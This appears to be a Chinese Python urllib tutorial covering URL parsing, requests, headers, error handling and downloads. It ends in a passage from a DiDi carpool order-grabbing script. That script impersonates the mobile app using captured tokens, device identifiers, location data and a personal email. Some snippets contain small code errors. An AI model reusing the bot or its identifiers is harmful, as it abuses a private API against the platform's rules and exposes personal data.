urllib.parse.parse_qs(qs, keep_blank_values=False, strict_parsing=False, encoding='utf-8', errors='replace')
该该函数用于解析查询字符串(application/x-www-form-urlencoded类型的数据),并以dict形式返回解析结果。

urllib.parse.parse_qsl(qs, keep_blank_values=False, strict_parsing=False, encoding='utf-8', errors='replace')
该函数用于解析查询字符串(application/x-www-form-urlencoded类型的数据),并以列表形式返回解析结果。

urllib.parse.urlencode(query, doseq=False, safe='', encoding=None, errors=None, quote_via=quote_plus)
将字典形式或列表形式的请求参数恢复成请求字符串。该函数相当于parse_qs()、parse_qsl()的逆函数。

urllib.parse.urljoin(base, url, allow_fragments=True)
该函数用于将一个base_URL和另一个资源URL连接成代表绝对地址的URL,urljoin()将两个URL拼接在一起返回代表绝对地址的URL,主要可能出现3种情况:
1、被拼接的URL只是一个相对路径path(不以斜线开头),那么该URL将会被拼接到base之后,如果base本身包含path部分则用被拼接的URL替换base所包含的path部分。
2、被拼接的URL是一个根路径path(以单斜线开头),那么该URL将会被拼接到base的域名之后。
3、被拼接的URL是一个绝对路径path(以双斜线开头),那么该URL将会被拼接到base的scheme之后。

</pre><textarea>
from urllib.parse import *
# 解析URL字符串
result = urlparse('http://www.crazyit.org:80/index.php;yeeku?name=fkit#frag')
print(result)
# ParseResult(scheme='http', netloc='www.crazyit.org:80', path='/index.php', params='yeeku', query='name=fkit', fragment='frag')
# 通过属性名和索引来获取URL的各部分
print('scheme:', result.scheme, result[0])    # http http
print('主机和端口:', result.netloc, result[1]) # www.crazyit.org:80 www.crazyit.org:80
print('主机:', result.hostname)                # www.crazyit.org
print('端口:', result.port)                    # 80
print('资源路径:', result.path, result[2])      # /index.php /index.php
print('参数:', result.params, result[3])       # yeeku yeeku
print('查询字符串:', result.query, result[4])   # name=fkit name=fkit
print('fragment:', result.fragment, result[5]) # frag frag
print(result.geturl())                         # http://www.crazyit.org:80/index.php;yeeku?name=fkit#frag

result = urlunparse(('http', 'www.crazyit.org:80', 'index.php', 'yeeku', 'name=fkit', 'frag'))
print('URL为:', result)  # URL为: http://www.crazyit.org:80/index.php;yeeku?name=fkit#frag

# 如果被解析的URL以双斜线(//)开头,那么urlparse()函数可以识别出主机,只是缺少scheme部分。但如果被解析的URL既没有scheme,也没有以双斜线(//)开头,那么urlparse()函数将会把这些URL都当成资源路径
# 解析以//开头的URL
result = urlparse('//www.crazyit.org:80/index.php')
print('scheme:', result.scheme, result[0])      #
print('主机和端口:', result.netloc, result[1])   # www.crazyit.org:80 www.crazyit.org:80
print('资源路径:', result.path, result[2])       # /index.php /index.php
# 解析没有scheme,也没有以双斜线(//)开头的URL从开头部分开始就会被当成资源路径
result = urlparse('www.crazyit.org/index.php')
print('scheme:', result.scheme, result[0])      #
print('主机和端口:', result.netloc, result[1])   #
print('资源路径:', result.path, result[2])       # www.crazyit.org/index.php www.crazyit.org/index.php

# 解析查询字符串,返回dict
result = parse_qs('name=fkit&name=%E7%96%AF%E7%8B%82java&age=12')
print(result)                 # {'name': ['fkit', '疯狂java'], 'age': ['12']}
# 解析查询字符串,返回list
result = parse_qsl('name=fkit&name=%E7%96%AF%E7%8B%82java&age=12')
print(result)                 # [('name', 'fkit'), ('name', '疯狂java'), ('age', '12')]
# 将列表格式的请求参数恢复成请求参数字符串
print(urlencode(result))      # name=fkit&name=%E7%96%AF%E7%8B%82java&age=12

# 被拼接URL不以斜线开头
result = urljoin('http://www.crazyit.org/users/login.html', 'help.html')
print(result)   # http://www.crazyit.org/users/help.html
result = urljoin('http://www.crazyit.org/users/login.html', 'book/list.html')
print(result)   # http://www.crazyit.org/users/book/list.html
# 被拼接URL以斜线(代表根路径path)开头
result = urljoin('http://www.crazyit.org/users/login.html', '/help.html')
print(result)   # http://www.crazyit.org/help.html
# 被拼接URL以双斜线(代表绝对URL)开头
result = urljoin('http://www.crazyit.org/users/login.html', '//help.html')
print(result)   # http://help.html

</textarea><pre>
【 urllib.request子模块 】
使用Urllib的request模块可以方便地实现Request的发送并得到Response
urllib.request模块提供了最基本的构造HTTP请求的方法,利用它可以模拟浏览器的一个请求发起过程,同时它还带有处理authenticaton(授权验证),redirections(重定向),cookies(浏览器Cookies)以及其它内容

urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)
用于打开url指定的资源,并从中读取数据。根据请求url的不同,该方法的返回值会发生动态改变。如果url是一个HTTP地址,那么该方法返回一个http.client.HTTPResponse对象

http.client.HTTPResponse对象主要包含的方法有:
read():返回二进制数据,二进制->字符串:decode(),字符串->二进制:encode(),碰到的编码格式只有gbk和utf8
readlines():按行读取
readinto()
getheader(name)
getheaders():元祖组成的列表
getcode():获取响应的状态码
fileno()

http.client.HTTPResponse对象主要属性:
url:获取请求的网址
headers:获取响应头部,字符串格式
status:响应的状态码
msg
version
status
reason
debuglevel
closed

data参数
可选,可通过data属性向被请求的URL发送数据,程序为data属性指定了一个bytes字节数据,该字节数据会以原始二进制流的方式提交给服务器,它要是字节流编码格式的内容即bytes类型,通过bytes()方法可进行转化,如果传递了这个data参数,它的请求方式就不再是GET方式请求而是POST;如果使用urlopen()函数向服务器页面发送GET请求参数则无须使用data属性,直接把请求参数附加在URL之后即可

timeout参数
可设置超时时间,单位秒,如果请求超出了设置的这个时间还没有得到响应就会抛出异常,如果不指定就会使用全局默认时间。它支持HTTP、HTTPS、FTP请求,因此可以通过设置这个超时时间来控制一个网页如果长时间未响应就跳过它的抓取,利用try except语句就可以实现这样的操作

cafile和capath两个参数是指定CA证书和它的路径,这个在请求HTTPS链接时会有用。
cadefault参数现在已经弃用了,默认为False
context参数必须是ssl.SSLContext类型,用来指定SSL设置

</pre><textarea>
from urllib.request import *

response = urlopen('https://www.python.org')
print(type(response))                    # < class 'http.client.HTTPResponse'>
print(response.status)                   # 200
print(response.getheaders())             # [('Server','nginx'),('Content-Type','text/html; charset=utf-8'), ('Content-Length','48446'),('Connection','close'),('Vary','Cookie')]
print(response.getheader('Server'))      # nginx
print(response.read().decode('utf-8'))
data = response.read(326)                # 按字节读取数据
print(data.decode('utf-8'))              # 将字节数据恢复成字符串

# 用context manager来管理打开的URL资源
with urlopen('http://www.crazyit.org/index.php') as f:
    data = f.read(326)          # 按字节读取数据
    print(data.decode('utf-8')) # 将字节数据恢复成字符串

    # 将响应的信息保存到文件
    with open('html.html', 'wb') as fp:
        fp.write(f.read())

</textarea>timeout<textarea>
import socket
import urllib.request
import urllib.error

try:
    response = urllib.request.urlopen('http://httpbin.org/get', timeout=0.1)
except urllib.error.URLError as e:
    if isinstance(e.reason, socket.timeout):
        print('TIME OUT')

</textarea><textarea>
import urllib
url = 'http://www.360buy.com/'
req = urllib.Request(url);
f = urllib.urlopen(req, timeout=30)
html = f.read().decode('gbk')        # gb2312
print(html)

</textarea><pre>
爬取gbk编码的页面需要使用decode进行转码,但在使用decode转换编码时提示如下错误:'gbk' codec can't decode bytes in position 1-2: illegal multibyte sequence
抓包尝试:$ sudo tcpdump -i eth0 -nnA 'src host www.360buy.com' > test.txt查看抓包结果都一堆乱乱的数据,这个应该是gzip压缩过后的数据。于是立马用gzip解压缩,然后就正常了

</pre><textarea>
import urllib2
import gzip, cStringIO
url = 'http://www.360buy.com/'
req = urllib2.Request(url);
req.add_header('Accept-Encoding', 'gzip, deflate');
f = urllib2.urlopen(req, timeout=30)
html = f.read()
#gzip解压缩
if html[:6] == '\x1f\x8b\x08\x00\x00\x00':
    html = gzip.GzipFile(fileobj = cStringIO.StringIO(html)).read()
html = html.decode('gbk')
print(html)

</textarea><pre>
【 Get 】
urllib的request模块可以非常方便地抓取URL内容,也就是发送一个GET请求到指定的页面,然后返回HTTP的响应:

</pre>对豆瓣的一个URLhttps://api.douban.com/v2/book/2129650进行抓取并返回响应<textarea>
from urllib import request
with request.urlopen('https://api.douban.com/v2/book/2129650') as f:
    data = f.read()
    print('Status:', f.status, f.reason)
    for k, v in f.getheaders():
        print('%s: %s' % (k, v))
    print('Data:', data.decode('utf-8'))

</textarea>发送GET请求参数<textarea>
import urllib.parse
params = urllib.parse.urlencode({'name': 'fkit', 'password': '123888'})
url = 'http://localhost:8888/test/get.jsp?%s' % params  # 将请求参数添加到URL的后面
with urlopen(url=url) as f:
    print(f.read().decode('utf-8'))                     # 读取服务器全部响应

</textarea><pre>
【 Post 】
如果要以POST发送一个请求,只需要把参数data以bytes形式传入。

</pre>通过data属性向被请求的URL发送数据<textarea>
from urllib.request import *
# with urlopen(url='https://localhost/cgi-bin/test.cgi', # 向https://localhost/cgi-bin/test.cgi发送请求数据
with urlopen(url='http://localhost:8888/test/test', data='测试数据'.encode('utf-8')) as f:
    print(f.read().decode('utf-8'))  # 读取服务器全部响应

# 上面程序需要在本地(localhost)部署一个Web应用,该程序对应的服务器端所使用的CGI代码为:
#!/usr/bin/env python
import sys
data = sys.stdin.read()
print('Content-type: text/plain\n\nGot Data:"%s"' % data)

运行上面程序,可以看到如下输出结果:
Got Data:"测试数据"

</textarea>模拟一个微博登录,先读取登录的邮箱和口令,然后按照weibo.cn的登录页的格式以username=xxx&password=xxx的编码传入<textarea>
from urllib import request, parse
print('Login to weibo.cn...')
email = input('Email: ')
passwd = input('Password: ')
login_data = parse.urlencode([
    ('username', email),
    ('password', passwd),
    ('entry', 'mweibo'),
    ('client_id', ''),
    ('savestate', '1'),
    ('ec', ''),
    ('pagerefer', 'https://passport.weibo.cn/signin/welcome?entry=mweibo&r=http%3A%2F%2Fm.weibo.cn%2F')
])

req = request.Request('https://passport.weibo.cn/sso/login')
req.add_header('Origin', 'https://passport.weibo.cn')
req.add_header('User-Agent', 'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25')
req.add_header('Referer', 'https://passport.weibo.cn/signin/login?entry=mweibo&res=wel&wm=3349&r=http%3A%2F%2Fm.weibo.cn%2F')

# 为data属性指定了一个bytes字节数据,该字节数据会以原始二进制流的方式提交给服务器
with request.urlopen(req, data=login_data.encode('utf-8')) as f:
    print('Status:', f.status, f.reason)
    for k, v in f.getheaders():
        print('%s: %s' % (k, v))
    print('Data:', f.read().decode('utf-8'))

# 如果登录成功获得的响应如下:
Status: 200 OK
Server: nginx/1.2.0
...
Set-Cookie: SSOLoginState=1432620126; path=/; domain=weibo.cn
...
Data: {"retcode":20000000,"msg":"","data":{...,"uid":"1658384301"}}

# 如果登录失败获得的响应如下:
Data: {"retcode":50011015,"msg":"\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef","data":{"username":"example@python.org","errline":536}}

</textarea>Handler:如果还需要更复杂的控制,比如通过一个Proxy去访问网站,需要利用ProxyHandler来处理<textarea>
proxy_handler = urllib.request.ProxyHandler({'http': 'http://www.example.com:3128/'})
proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
proxy_auth_handler.add_password('realm', 'host', 'username', 'password')
opener = urllib.request.build_opener(proxy_handler, proxy_auth_handler)
with opener.open('http://www.example.com/login.html') as f:
    pass

</textarea><pre>
如果要想模拟浏览器发送GET请求就可以利用更强大的Request类来构建一个请求

实际上使用data属性不仅可以发送POST请求,还可以发送PUT、PATCH、DELETE等请求,此时需要使用urllib.request.Request来构建请求参数。程序使用urlopen()函数打开远程资源时,第一个url参数既可以是URL字符串,也可以使用urllib.request.Request对象,通过构造这个这个数据结构,一方面可以将请求独立成一个对象,另一方面可配置参数更加丰富和灵活

urllib.request.Request对象的构造器:
urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)
使用Request可以通过method指定请求方法,也可以通过data指定请求参数,还可以通过headers指定请求头,通过往Request对象添加HTTP头就可以把请求伪装成浏览器

url参数是请求URL,这个是必传参数,其他的都是可选参数。
data参数如果要传必须传bytes(字节流)类型的,如果是一个字典可以先用urllib.parse模块里的urlencode()编码。
headers参数是一个字典,即Request Headers,可在构造Request时通过headers参数直接构造,也可通过调用Request实例的add_header()方法来添加,Request Headers最常用的用法就是通过修改User-Agent来伪装浏览器,默认User-Agent是Python-urllib,可以通过修改它来伪装浏览器。
origin_req_host参数指的是请求方的host名称或IP地址。
unverifiable参数指的是这个请求是否是无法验证的,默认False,即用户没有足够权限来选择接收这个请求的结果。例如请求一个HTML文档中的图片,但没有自动抓取图像的权限,这时unverifiable的值就是True。
method参数是一个字符串,它用来指示请求使用的方法,比如GET,POST,PUT等

</pre><textarea>
from urllib import request, parse

url = 'http://httpbin.org/post'
headers = {
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
    'Host': 'httpbin.org'
}
dict = { 'name': 'Germey' }
data = bytes(parse.urlencode(dict), encoding='utf8')
req = request.Request(url=url, data=data, headers=headers, method='POST')
response = request.urlopen(req)
print(response.read().decode('utf-8'))

</textarea>模拟iPhone6去请求豆瓣首页,豆瓣会返回适合iPhone的移动版网页<textarea>
from urllib import request

# 创建Request对象
req = request.Request('http://www.douban.com/')
# 通过Request的add_header()方法添加了一个Referer请求头,服务器端的处理程序将可以读到此处添加的请求头
req.add_header('Referer', 'http://www.crazyit.org/')
# 添加请求头
req.add_header('User-Agent', 'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25')

with request.urlopen(req) as f:
    print('Status:', f.status, f.reason)
    for k, v in f.getheaders():
        print('%s: %s' % (k, v))
    print('Data:', f.read().decode('utf-8'))

</textarea>通过Request对象来发送PUT请求<textarea>
from urllib.request import *
params = 'put请求数据'.encode('utf-8')
# 创建Request对象,设置使用PUT请求
req = Request(url='http://localhost:8888/test/put', data=params, method='PUT')
with urlopen(req) as f:
    print(f.status)
    print(f.read().decode('utf-8'))

</textarea>通过urlopen()函数打开远程资源之后也可方便地读取远程资源,甚至实现多线程下载,如下程序实现了一个多线程下载的工具类<textarea>
from urllib.request import *
import threading

class DownUtil:
    '''
    程序中DownUtils类的download()方法负责按如下步骤来实现多线程下载:
    1、使用urlopen()方法打开远程资源。
    2、获取指定的URL对象所指向资源的大小(通过Content-Length响应头获取)。
    3、计算每个线程应该下载网络资源的哪个部分(从哪个字节开始,到哪个字节结束)。
    4、依次创建并启动多个线程来下载网络资源的指定部分。

    程序已经实现了多线程下载的核心代码,如果要实现断点下载,则需要额外增加一个配直文件(读者可以发现,所有的断点下载工具都会在下载开始时生成两个文件:一个是与网络资源具有相同大小的空文件;一个是配置文件),该配置文件分别记录每个线程已经下载到哪个字节,当网络断开后再次开始下载时,每个线程根据配置文件中记录的位置向后下载即可。
    '''

    def __init__(self, path, target_file, thread_num):
        self.path = path                # 定义下载资源的路径
        self.thread_num = thread_num    # 定义需要使用多少个线程下载资源
        self.target_file = target_file  # 指定所下载的文件的保存位置
        self.threads = []               # 初始化threads数组

    def download(self):
        req = Request(url=self.path, method='GET')  # 创建Request对象
        req.add_header('Accept', '*/*')             # 添加请求头
        req.add_header('Charset', 'UTF-8')
        req.add_header('Connection', 'Keep-Alive')
        f = urlopen(req)                            # 打开要下载的资源
        self.file_size = int(dict(f.headers).get('Content-Length', 0)) # 获取要下载的文件大小
        f.close()
        current_part_size = self.file_size // self.thread_num + 1      # 计算每个线程要下载的资源大小
        for i in range(self.thread_num):
            start_pos = i * current_part_size   # 计算每个线程下载的开始位置
            t = open(self.target_file, 'wb')    # 每个线程使用一个wb模式打开的文件进行下载
            t.seek(start_pos, 0);               # 定位该线程的下载位置
            td = DownThread(self.path, start_pos, current_part_size, t) # 创建下载线程
            self.threads.append(td)
            td.start()                          # 启动下载线程

    # 获取下载的完成百分比
    def get_complete_rate(self):
        sum_size = 0                              # 统计多个线程已经下载的总大小
        for i in range(self.thread_num):
            sum_size += self.threads[i].length
        return sum_size / self.file_size          # 返回已经完成的百分比

# 定义DownThread线程类,该线程类负责读取从start_pos开始、长度为current_part_size的所有字节数据,并写入本地文件对象中。DownThread线程类的run()方法就是一个简单的输入/输出实现
class DownThread(threading.Thread):
    def __init__(self, path, start_pos, current_part_size, current_part):
        super().__init__()
        self.path = path
        self.start_pos = start_pos                   # 当前线程的下载位置
        self.current_part_size = current_part_size   # 定义当前线程负责下载的文件大小
        self.current_part = current_part             # 当前线程需要下载的文件块
        self.length = 0                              # 定义该线程已下载的字节数

    def run(self):
        req = Request(url = self.path, method='GET') # 创建Request对象
        req.add_header('Accept', '*/*')              # 添加请求头
        req.add_header('Charset', 'UTF-8')
        req.add_header('Connection', 'Keep-Alive')
        f = urlopen(req)                             # 打开要下载的资源
        # 跳过self.start_pos个字节,表明该线程只下载自己负责的那部分内容
        for i in range(self.start_pos):
            f.read(1)
        # 读取网络数据,并写入本地文件
        while self.length < self.current_part_size:
            data = f.read(1024)
            if data is None or len(data) <= 0:
                break
            self.current_part.write(data)

            self.length += len(data)                 # 累计该线程下载的总大小
        self.current_part.close()
        f.close()

# 有了上面的DownUtil工具类之后,接下来就可以在主程序中调用该工具类的download()方法执行下载
du = DownUtil("http://www.crazyit.org/data/attachment/forum/201801/19/121212ituj1s9gj8g880jr.png", 'a.png', 3)
du.download()

def show_process():
    print("已完成:%.2f" % du.get_complete_rate())
    global t
    if du.get_complete_rate() < 1:
        # 通过定时器启动0.1之后执行show_process函数
        t = threading.Timer(0.1, show_process)
        t.start()

# 通过定时器启动0.1之后执行show_process函数
t = threading.Timer(0.1, show_process)
t.start()

</textarea><pre>
【 异常处理 】
Request的发送过程在网络情况不好的情况下会出现了异常,如果不处理这些异常,程序很可能报错而终止运行,所以异常处理还是十分有必要的
Urllib的error模块定义了由request模块产生的异常。如果出现了问题,request模块便会抛出error模块中定义的异常
主要有这两个处理异常类:URLError和HTTPError

</pre><textarea>
from urllib import request, error
try:
    response = request.urlopen('http://cuiqingcai.com/index.htm')
except error.URLError as e:
    print(e.reason)

try:
    response = request.urlopen('http://cuiqingcai.com/index.htm')
except error.HTTPError as e:
    print(e.reason, e.code, e.headers, seq='\n')

</textarea><pre>
HTTPError有三个属性
code,返回HTTP Status Code,即状态码,比如404网页不存在,500服务器内部错误等
reason,同父类一样,返回错误的原因。
headers,返回Request Headers。

</pre>URLError是HTTPError的父类,所以可先选择捕获子类的错误,再去捕获父类的错误,所以上述代码更好的写法如下<textarea>
from urllib import request, error

try:
    response = request.urlopen('http://cuiqingcai.com/index.htm')
except error.HTTPError as e:
    print(e.reason, e.code, e.headers, sep='\n')
except error.URLError as e:
    print(e.reason)
else:
    print('Request Successfully')

# 这样就可以做到先捕获HTTPError,获取它的错误状态码、原因、Headers等详细信息。如果非HTTPError,再捕获URLError异常,输出错误原因。最后用else来处理正常的逻辑,这是一个较好的异常处理写法

</textarea><pre>
【 下载图片、视频等资源到本地 】
urllib.urlretrieve(url[, filename[, reporthook[, data]]])
将获取的url的内容写入filename文件中,该方法返回一个包含两个元素的元组(filename, headers),filename表示保存到本地的路径,header表示服务器的响应头。
url:外部或本地url,url不要含有中文
filename:指定了保存到本地的路径,目录须先创建,如果未指定该参数urllib会生成一个临时文件来保存数据
reporthook:回调函数,将在建立网络连接时调用一次,并且在此后每个块读取后调用一次。这个回调函数将传递三个参数:到目前为止传输的块计数、以字节为单位的块大小以及文件的总大小,可以利用这个回调函数来显示当前的下载进度。
data:指post到服务器的数据

</pre><textarea>
form urllib import request
import urllib.request                # 简写
jpg_link ＝ '......'                 # 图片链接
request.urlretrieve(jpg_link, path)  # path为路径加名字如~/workjpg/111.jpg如果不需要路径也要有个名字,如111.jpg就直接保存在当前目录下

</textarea><textarea>
def Schedule(a, b, c):
    per = 100.0*a*b/c
    if per > 100 :
        per = 1
    sys.stdout.write("  " + "%.2f%% 已经下载的大小:%ld 文件大小:%ld" % (per,a*b,c) + '\r')
    sys.stdout.flush()

request.urlretrieve(url=url,filename=filename,reporthook=Schedule)

</textarea><textarea>
import urllib.request
import sys

DATA_URL = 'http://www.python.org/ftp/python/2.7.5/Python-2.7.5.tar.bz2'
filename = DATA_URL.split('/')[-1]

def _progress(block_num, block_size, total_size):
    '''回调函数
       @block_num: 已经下载的数据块
       @block_size: 数据块的大小
       @total_size: 远程文件的大小
    '''
    sys.stdout.write('\r>> Downloading %s %.1f%%' % (filename, float(block_num * block_size) / float(total_size) * 100.0))
    sys.stdout.flush()  # 刷新输出

filename, headers = urllib.request.urlretrieve(DATA_URL, filename, _progress)
print(filename, headers)

</textarea><textarea>
import urllib.request
from lxml import etree
import requests, sys
def Schedule(blocknum,blocksize,totalsize):
    '''''
    blocknum:已经下载的数据块
    blocksize:数据块的大小
    totalsize:远程文件的大小
    '''
    per = 100.0 * blocknum * blocksize / totalsize
    if per > 100 :
        per = 100
    global i
    sys.stdout.write('\r>> Downloading %s %.1f%%' % (i, per))
    sys.stdout.flush()  # 刷新输出

headers={'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
r = requests.get('http://www.ivsky.com/tupian/ziranfengguang/', headers=headers)

html = etree.HTML(r.text)            # 使用lxml解析网页
img_urls = html.xpath('.//img/@src') # 先找到所有的img
i = 0
print(img_urls)
for img_url in img_urls:
    urllib.request.urlretrieve('http:'+img_url, 'img'+str(i)+'.jpg', Schedule)
    i += 1
    print()

</textarea><textarea>
import requests
import urllib.request
from lxml import etree
import time

def crawl():
    url = 'http://www.ivsky.com/tupian/haiyangshijie/'
    headers = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
    }
    resp = requests.get(url,headers=headers)
    if resp.status_code == 200:
        resp.encoding = 'UTF-8'
        html = etree.HTML(resp.text)
        img_titles = html.xpath('//ul[@class="ali"]//a/@title')
        img_urls = html.xpath('//ul[@class="ali"]//a/img/@src')
        for img_title,img_url in zip(img_titles,img_urls):
            print('开始下载{title}.jpg:{url}'.format(title = img_title, url = 'http:' + img_url))
            result = urllib.request.urlretrieve('http:' + img_url,
                filename = '{title}.jpg'.format(title=img_title),
                reporthook = loading)
            print(result)

def loading(blocknum, blocksize, totalsize):
    """
    回调函数: 数据传输时自动调用
    blocknum:已经传输的数据块数目
    blocksize:每个数据块字节
    totalsize:总字节
    """
    percent = int(100*blocknum*blocksize/totalsize)
    if percent > 100: percent = 100
    print("正在下载>>> {}%".format(percent))
    time.sleep(0.5)

if __name__ == '__main__':
 crawl()

</textarea>使用Python2.6/7实现上下班抢个顺风单脚本<textarea>
#!/usr/bin/python
# -*- coding: utf-8 -*-
'''
1.这个小程序运行在电脑上,人在回家的路上,有时不想接单了也不好控制,于是把一些参数都写到坚果云下的一个文本文件里,手机上也装一个坚果云,如果不想接单就把参数改一下就可以了,详见函数loadTimeConfig.

2.程序用urllib2给服务器发请求模拟手机操作以查找单子,所以对滴滴服务器有一定的压力.如果频率太快,滴滴能发现

3.参数的抓取用的是Charles抓手机端访问的资源
抓包就是将网络传输发送与接收的数据包进行截获、重发、编辑、转存等操作,也用来检查网络安全。
做网络爬虫,第一步就是通过抓包工具对目标网站进行分析,应对各种反爬策略
抓包也经常被用来进行数据截取等,黑客常常会用抓包软件获取你非加密的上网数据,然后通过分析,结合社会工程学进行攻击,所以学会抓包对于学好网络安全技术十分重要
网络抓包工具比较主流的有Fiddler,Charles,WireShark,MITMProxy等

charles相当于一个插在服务器和客户端之间的"过滤器";
当客户端向服务器发起请求的时候,先到charles进行过滤,然后charles在把最终的数据发送给服务器;
此时charles发给服务器的数据,不一定是客户端请求的数据;charles在接到客户端的请求时可以自由的修改数据,甚至可以直接Block客户端发的请求;
服务器接收请求后的返回数据,也会先到charles,经过charles过滤后再发给客户端;
客户端接收的数据,不一定就是服务器返回的数据,而是charles给的数据;
所以charles能实现的功能,对前端开发者来说非常有吸引力,相当于请求和响应都可控的,而且charles为了控制更加方面,提供很多简洁的操作
'''

import urllib, traceback, smtplib, datetime
import os, sys, time,zlib,json,ConfigParser,codecs
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

import email.MIMEMultipart
import email.MIMEText
import email.MIMEBase

from utility import getPyLogger,debug,info

#mail_host="smtp.qq.com"  #设置服务器
mail_host='smtp.qq.com'
mail_user="358275018@qq.com" #用户名
mail_pass="xxxxxxxxx"  #口令, 请修改!!!

MORNING_START="08:30"  #上班, 截获从8:30到8:40的顺风单
MORNING_END="08:40"
AFTERNOON_START="18:05"  #下班, 截获从18:05到18:20的顺风单
AFTERNOON_END="18:20"
last_modify_time = 0

TOKEN='JPXq-mw6-YPhBnegPQ6pdbwJvXMOw5SnLfWW6-gl1pVUjDsOwkAMRO8ytQvb62wc34Y_FAiJFVW0d2faVCO9N3o7TihAcEZ5WqyLbov3toYKrmQuuKF2jPdAWfRwN9dNMD6_74VKp-B-VA8mrXkSZMvO-pNEuS8e5z8AAP__'

# 手机和电脑上都安装坚果云, 创建文本文件ditime2.txt, 在手机上修改参数就可以控制正在电脑上运行的本程序
def loadTimeConfig():
 global last_modify_time,MORNING_START,MORNING_END,AFTERNOON_START,AFTERNOON_END
 file_name = r"C:\ddrive\mynutstore\ditime2.txt"
 if(not os.path.exists(file_name)):
 return
 statinfo=os.stat(file_name)
 if(statinfo.st_mtime>last_modify_time):
 last_modify_time = statinfo.st_mtime
 config = ConfigParser.ConfigParser()
 try:
  config.readfp(codecs.open(file_name, "r", "utf_16"))
 except Exception, e:
  config.read(file_name)
 try:
  MORNING_START=config.get('TIME_INFO', 'MORNING_START').strip()
 except Exception, e:
  pass
 try:
  MORNING_END=config.get('TIME_INFO', 'MORNING_END').strip()
  print 'MORNING_END=',MORNING_END
 except Exception, e:
  pass
 try:
  AFTERNOON_START=config.get('TIME_INFO', 'AFTERNOON_START').strip()
 except Exception, e:
  pass
 try:
  AFTERNOON_END=config.get('TIME_INFO', 'AFTERNOON_END').strip()
 except Exception, e:
  pass

def getHtmlContent(respInfo):
 htmlContent = ''
 try:
 respHtml = respInfo.read()
 if( ("Content-Encoding" in respInfo.headers) and (respInfo.headers['Content-Encoding'] == "gzip")):
  htmlContent = zlib.decompress(respHtml, 16+zlib.MAX_WBITS);
 else:
  htmlContent = respHtml
 except BaseException, e:
 debug(logger, traceback.format_exc())
 return htmlContent

def send_mail(to_list,sub,content):
 me="358275018@qq.com"
 msg = MIMEText(content,_subtype='plain',_charset='gb2312')
 msg['Subject'] = sub
 msg['From'] = me
 msg['To'] = ";".join(to_list)
 try:
 server = smtplib.SMTP()
 server.connect(mail_host)
 server.login(mail_user,mail_pass)
 server.sendmail(me, to_list, msg.as_string())
 server.close()
 return True
 except Exception, e:
 print str(e)
 return False

headers = {
 'Host': 'api.didialift.com'
 ,'Accept-Encoding': 'gzip'
 ,'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; MI 4LTE MIUI/V7.2.11.0.MXDCNDB)'
}
common_headers = {
 'Host': 'common.diditaxi.com.cn'
 ,'Accept-Encoding': 'gzip'
 ,'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; MI 4LTE MIUI/V7.2.11.0.MXDCNDB)'
}
xiaojukeji_headers = {
 'Host': 'pay.xiaojukeji.com'
 ,'Accept-Encoding': 'gzip, deflate'
 ,'Accept': '*/*'
 ,'Accept-Language': 'zh-Hans;q=1, en;q=0.9, fr;q=0.8, de;q=0.7, zh-Hant;q=0.6, ja;q=0.5'
 ,'User-Agent': 'OneTravel/4.1.4.3 (iPhone; iOS 7.1.2; Scale/2.00)'
}

ROUTE_ID_MORNING1='12132747' #家->办公室
ROUTE_ID_AFTERNOON1='109950277' #办公室->家
one_way_map = {
 'android_id':'2227d1a93826902'
 ,'appversion':'4.4.10'
 ,'at_mb_cid':'19771395'
 ,'at_mb_lac':'16836'
 ,'at_mb_mcc':'460'
 ,'at_mb_mnc':'01'
 ,'at_net_st':'1'
 ,'at_wf_bssid':'8c:be:be:16:b5:74'
 ,'at_wf_ssid':'"zzzzzz"'
 ,'channel':'0'
 ,'city_id':'14'
 ,'cpu':'Processor : ARMv8 Processor rev 1 (v8l)'
 ,'datatype':'1'
 ,'date_id':'1477584000'
 ,'dviceid':'bf39e245983e7ce8b96ec5cb468f4b9e'
 ,'filter':'0'
 ,'imei':'8659310207085419EFC357283F3AFD66688CC444C08403A' ################
 ,'lat':'38.844252869870736'
 ,'lng':'121.51104529558397'
 ,'locatePerm':'1'
 ,'locateTime':'1462240824'
 ,'mac':'74:51:ba:55:a6:8f'
 ,'maptype':'soso'
 ,'model':'MI 4LTE'
 ,'networkType':'WIFI'
 ,'os':'6.0.1'
 ,'route_id':'12132747'
 #,'sig':'2cdde9c6ac1b653c19a31a535b1959acf0c61156'
 ,'suuid':'F759479A0C2CCDE83BE5EA8D5F6EC05E_15'
 ,'token':TOKEN
 ,'uuid':'D85C052433285BB365875F9F3AA28EFE'###############
 ,'vcode':'162'
 ,'wsgsig':'sign error'
}

#抢单参数
strive_para_map = {
 'android_id':'2227d1a93826902' #'_t':'1449818404'
 ,'appversion':'4.4.10'
 ,'at_mb_cid':'18589187'
 ,'at_mb_lac':'16838'
 ,'at_mb_mcc':'460'
 ,'at_mb_mnc':'01'
 ,'at_net_st':'1'
 ,'at_wf_bssid':'8c:be:be:16:b5:74'
 ,'at_wf_ssid':'zzzzzz'
 ,'channel':'0'
 ,'city_id':'14'
 ,'cpu':'Processor : ARMv8 Processor rev 1 (v8l)'
 ,'datatype':'1'
 ,'dviceid':'bf39e245983e7ce8b96ec5cb468f4b9e'
 ,'imei':'8659310207085419EFC357283F3AFD66688CC444C08403A'
 ,'lat':'38.849033'
 ,'lng':'121.518660'
 ,'locatePerm':'1'
 ,'locateTime':'1449818399'
 ,'mac':'74:51:ba:55:a6:8f'
 ,'maptype':'soso'
